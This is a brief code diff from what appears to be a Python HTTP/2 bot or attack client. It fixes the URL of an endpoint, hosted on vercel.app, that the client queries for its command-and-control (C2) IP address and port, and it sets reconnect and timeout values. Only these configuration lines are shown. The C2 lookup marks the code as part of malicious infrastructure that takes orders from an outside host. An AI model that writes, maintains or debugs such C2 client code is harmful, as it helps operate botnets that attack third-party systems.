@@ -29,7 +29,7 @@ from h2.events import (
 from h2.errors import ErrorCodes
 from h2.settings import SettingCodes
 
-C2_IP_URL = "https://ipvariant.vercel.app/ipl"
+C2_IP_URL = "https://ipvariant.vercel.app/ip"
 C2_PORT_URL = "https://ipvariant.vercel.app/port"
 RECONNECT_DELAY = 15
 SOCKET_TIMEOUT = 10
